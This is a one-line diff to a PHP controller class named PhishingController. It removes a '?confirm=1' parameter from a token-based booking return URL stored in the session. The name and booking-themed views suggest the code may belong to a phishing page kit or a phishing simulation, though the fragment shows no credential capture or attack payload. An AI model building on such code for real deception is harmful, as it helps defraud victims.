@@ -179,7 +179,7 @@ class PhishingController extends Controller
             return redirect('/app/intro/availability-' . $newToken);
         }
 
-        session(['booking_return_url' => url('/app/intro/availability-' . session('_otio_token') . '?confirm=1')]);
+        session(['booking_return_url' => url('/app/intro/availability-' . session('_otio_token'))]);
 
         return view('booking-otio', [
             'metaBasePath' => $session['metaBasePath'],
